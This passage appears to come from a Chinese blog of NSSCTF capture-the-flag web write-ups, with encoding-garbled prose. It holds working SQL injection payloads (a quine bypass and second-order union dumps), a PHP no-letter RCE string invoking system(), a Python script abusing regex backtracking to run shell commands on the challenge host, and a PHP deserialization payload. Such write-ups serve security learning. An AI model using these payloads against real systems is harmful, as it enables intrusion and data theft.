class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“</strong></p><p>QuineåŸºæœ¬å½¢å¼ï¼š</p><blockquote><p> replace(replace(â€˜strâ€™,char(34),char(39)),char(46),â€˜strâ€™)</p></blockquote><p>å…ˆå°†stré‡Œçš„åŒå¼•å·æ›¿æ¢æˆå•å¼•å·ï¼Œå†ç”¨stræ›¿æ¢stré‡Œçš„.</p><p>stråŸºæœ¬å½¢å¼ï¼ˆå¯ä»¥ç†è§£æˆä¸Šé¢çš„â€.â€ï¼‰ï¼š</p><blockquote><p> replace(replace(â€œ.â€,char(34),char(39)),char(46),â€.â€)</p></blockquote><p>å®Œæ•´çš„Quineå°±æ˜¯<em><strong>QuineåŸºæœ¬å½¢å¼+stråŸºæœ¬å½¢å¼</strong></em></p><p>è¿™æ—¶æˆ‘ä»¬å†å›å¤´çœ‹é¢˜ç›®</p><p>stråŸºæœ¬å½¢å¼ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#</span><br></pre></td></tr></table></figure><p>quineåŸºæœ¬å½¢å¼ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;str&#x27;,char(34),char(39)),char(46),&#x27;str&#x27;)#</span><br></pre></td></tr></table></figure><p>æ€»ä½“ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ­¤å¤„charè¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆç”¨chrä¹Ÿè¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,chr(34),chr(39)),chr(46),&quot;.&quot;)#&#x27;,chr(34),chr(39)),chr(46),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,chr(34),chr(39)),chr(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162019665.png" alt="image-20241201162019665"></p><p>NSSCTF{23e578bc-4904-467f-8c73-544bccadb796}</p><h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="[October 2019]Twice SQL Injection"></a>[October 2019]Twice SQL Injection</h2><p>æ ‡é¢˜ç›´è¯´äº†ï¼ŒäºŒæ¬¡æ³¨å…¥</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162431475.png" alt="image-20241201162431475"></p><p>å­˜åœ¨ç™»é™†æ³¨å†Œç•Œé¢ï¼Œå¯èƒ½å°±æ˜¯é€šè¿‡æ³¨å†Œï¼Œå°†æ¶æ„sqlå­˜å…¥æ•°æ®åº“ï¼Œç™»é™†æ—¶å°†usernameä»£å…¥selectè¯­å¥ä»è€Œå¯¼è‡´äº†äºŒæ¬¡æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select database()#</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Špayloadä½¿ç™»é™†åé¡µé¢å›æ˜¾ctftraining</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162925243.png" alt="image-20241201162925243" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;)#</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201163048605.png" alt="image-20241201163048605" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(flag) from flag)#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;1f52dc37-5280-432e-8935-ed7a31f848a0&#125;</span><br></pre></td></tr></table></figure><h2 id="é¹åŸæ¯-2022-ç®€å•çš„php"><a href="#é¹åŸæ¯-2022-ç®€å•çš„php" class="headerlink" title="[é¹åŸæ¯ 2022]ç®€å•çš„php"></a>[é¹åŸæ¯ 2022]ç®€å•çš„php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">80</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27; Hello&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æ— å­—æ¯å­—æ¯rceå’Œæ— å‚rceçš„ç»“åˆç‰ˆ</p><p>çœ‹è¿‡æ»¤ï¼Œç›´æ¥ç”¨å–åå°±å¯ä»¥</p><p>æœ€ç»ˆæƒ³è¦æ„é€ çš„æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(end(getallheaders()));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span><br></pre></td></tr></table></figure><p> ç„¶åç”¨äºŒç»´æ•°ç»„è¿›è¡Œæ‹¼æ¥å¿…é¡»æœ‰[!%FFè¿›è¡Œåˆ†å‰²]</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201165516664.png" alt="image-20241201165516664" style="zoom:67%;" /><p>NSSCTF{8eb0d6fc-55b1-4d5b-90bc-5140b5565b6b}</p><h2 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å†åŠ æŠŠæ²¹å–”&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åªéœ€ç»•è¿‡preg_matchåé¢å°±ç®€å•äº†ï¼Œpregå›æº¯æ¬¡æ•°ç»•è¿‡ï¼Œå¤§äº1000000å­—ç¬¦å°±å¯ä»¥å•¦ç®€å•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28728/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;eeeee&quot;,&quot;aaa&quot;:&quot;&#x27;</span>+<span class="string">&quot;$&quot;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">res=requests.post(url,data=&#123;<span class="string">&quot;letter&quot;</span>:payload&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201195030922.png" alt="image-20241201195030922"></p><p>å›æ˜¾ä¸å†æ˜¯å†åŠ æŠŠæ²¹å–”ï¼Œé‚£ä¹ˆå°±æˆåŠŸäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç»•è¿‡çš„å°±æ˜¯checkdataå‡½æ•°ï¼</p><p>evalçš„è¯å¯ä»¥çŸ­æ ‡ç­¾+åå¼•å·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28728/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`ls /`?&gt;&quot;,&quot;aaa&quot;:&quot;&#x27;</span>+<span class="string">&quot;$&quot;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">res=requests.post(url,data=&#123;<span class="string">&quot;letter&quot;</span>:payload&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>æ ¹ç›®å½•å‘ç°&#x2F;flagï¼Œé‚£ä¹ˆå°±æ‹¿æäº†å•Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl /f*</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201195811853.png" alt="image-20241201195811853"></p><h2 id="CISCN-2023-ååŒ—-ez-date"><a href="#CISCN-2023-ååŒ—-ez-date" class="headerlink" title="[CISCN 2023 ååŒ—]ez_date"></a>[CISCN 2023 ååŒ—]ez_date</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])); </span><br></pre></td></tr></table></figure><p>phpååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">date</span>(<span class="string">&quot;/f\l\a\g&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#/flag</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$content=date($this-&gt;file);</span><br><span class="line"></span><br><span class="line">#  $contentæ¥å—ç»è¿‡è¢«dateå‡½æ•°æ ¼å¼åŒ–åçš„å˜é‡file</span><br><span class="line">#date()çš„è¯´æ˜ï¼š</span><br><span class="line">#è¯¥æ–¹æ³•ä¼šæ£€æµ‹ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯å¦æœ‰ç‰¹å®šçš„æ ¼å¼åŒ–å­—ç¬¦ï¼Œå¦‚Yï¼ˆå¹´ä»½ï¼‰ã€mï¼ˆæœˆä»½ï¼‰ã€dï¼ˆå¤©ï¼‰ã€Hï¼ˆæ—¶ï¼‰ã€iï¼ˆåˆ†é’Ÿï¼‰ã€sï¼ˆç§’ï¼‰ç­‰</span><br><span class="line">#    æ£€æµ‹å­˜åœ¨åˆ™ä¼šå°†æ ¼å¼åŒ–å­—ç¬¦æ›¿æ¢ä¸ºå½“å‰æ—¶é—´çš„å¯¹åº”éƒ¨åˆ†ï¼Œå¦åˆ™å°†å­—ç¬¦è¿›è¡ŒåŸæ ·è¾“å‡ºï¼ŒåŒæ—¶å¯ç”¨è½¬ä¹‰å­—ç¬¦å°†æ ¼å¼åŒ–å­—ç¬¦åŸæ ·è¾“å‡º</span><br></pre></td></tr></table></figure><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;/f\l\a\g&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">date</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h2 id="NISACTF-2022-babyupload"><a href="#NISACTF-2022-babyupload" class="headerlink" title="[NISACTF 2022]babyupload"></a>[NISACTF 2022]babyupload</h2><p>æ‰“å¼€åå‡ºç°äº†ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ ç•Œé¢ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æºç ï¼Œå‘ç°hintä¸º&#x2F;sourceï¼Œè®¿é—®ä¸€ä¸‹è·å¾—æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, g, send_from_directory</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SCHEMA = <span class="string">&quot;&quot;&quot;CREATE TABLE files (</span></span><br><span class="line"><span class="string">id text primary key,</span></span><br><span class="line"><span class="string">path text</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    g_db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> g_db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        g_db = g._database = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> g_db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>():</span><br><span class="line">    os.remove(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    cur = db().cursor()</span><br><span class="line">    cur.executescript(SCHEMA)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">    Select image to upload:</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;!-- /source --&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(directory=<span class="string">&quot;/var/www/html/&quot;</span>, path=<span class="string">&quot;www.zip&quot;</span>, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))</span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone()</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(res[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 